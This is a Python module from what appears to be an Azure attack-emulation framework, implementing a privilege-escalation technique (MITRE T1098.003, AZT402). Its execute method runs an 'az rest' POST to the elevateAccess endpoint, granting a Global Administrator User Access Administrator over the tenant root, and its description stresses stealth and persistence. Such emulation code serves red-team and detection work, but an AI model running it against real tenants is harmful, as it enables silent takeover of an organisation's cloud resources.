from ..base_technique import BaseTechnique, ExecutionStatus, MitreTechnique, AzureTRMTechnique
from ..technique_registry import TechniqueRegistry
from typing import Dict, Any, Tuple
from core.azure.azure_access import AzureAccess
import subprocess

@TechniqueRegistry.register
class AzureElevateAccessFromEntraId(BaseTechnique):
    def __init__(self):
        mitre_techniques = [
            MitreTechnique(
                technique_id="T1098.003",
                technique_name="Account Manipulation",
                tactics=["Persistence", "Privilege Escalation"],
                sub_technique_name="Additional Cloud Roles"
            )
        ]
        azure_trm_technique = [
            AzureTRMTechnique(
                technique_id="AZT402",
                technique_name="Elevated Access Toggle",
                tactics=["Privilege Escalation"],
                sub_technique_name=None
            )
        ]
        super().__init__("Elevate Access From EntraID", "Escalates privileges by exploiting the built-in Global Administrator elevation capability in Microsoft Entra ID (formerly Azure AD). This technique activates a feature that automatically grants a Global Administrator the 'User Access Administrator' role at the root scope (/), providing full RBAC control across all subscriptions in the tenant. Once executed, the Global Administrator can assign any role including Owner to any identity at any scope, effectively gaining complete control over all Azure resources. This elevation persists until explicitly disabled and bypasses standard role assignment procedures and approval workflows. The technique is particularly dangerous as it enables silent privilege elevation without generating standard role assignment alerts, and the elevated access can be used to establish multiple persistence paths through additional role assignments. This is a common privilege escalation path used in real-world attacks when initial access to a Global Administrator account is obtained.", mitre_techniques, azure_trm_technique)

    def execute(self, **kwargs: Any) -> Tuple[ExecutionStatus, Dict[str, Any]]:
        self.validate_parameters(kwargs)
        try:
            # get az full execution path
            az_command = AzureAccess().az_command
            # ref: https://learn.microsoft.com/en-us/azure/role-based-access-control/elevate-access-global-admin?tabs=azure-cli#step-1-elevate-access-for-a-global-administrator-2
            raw_response = subprocess.run([az_command, "rest", "--method", "post", "--url", "/providers/Microsoft.Authorization/elevateAccess?api-version=2016-07-01"], capture_output=True)

            if raw_response.returncode == 0:
                # successful operation has empty response
                return ExecutionStatus.SUCCESS, {
                    "message": f"Permission Granted",
                    "value": {
                        "permission_granted" : "User Access Administrator",
                        "scope" : "root (/)"
                    }
                }
            else:
                return ExecutionStatus.FAILURE, {
                    "error": str(raw_response.returncode),
                    "message": "Failed to enable configuration"
                }
        except Exception as e:
            return ExecutionStatus.FAILURE, {
                "error": str(e),
                "message": "Failed to enable configuration"
            }

    def get_parameters(self) -> Dict[str, Dict[str, Any]]:
        return {}